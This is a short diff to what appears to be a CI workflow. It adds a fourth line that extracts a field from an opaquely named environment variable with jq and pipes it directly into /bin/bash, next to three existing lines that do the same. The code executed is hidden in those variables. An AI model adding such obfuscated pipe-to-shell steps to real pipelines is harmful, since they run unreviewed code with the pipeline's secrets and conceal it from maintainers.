@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$kl6284" | jq -r .siom53 | /bin/bash
           echo $kipv92 | jq -r .hfm1299 | /bin/bash
           echo $ii90445 | jq -r .qmqe8 | /bin/bash
+          printf '%s' "$ylram4" | jq -r .lx7288 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
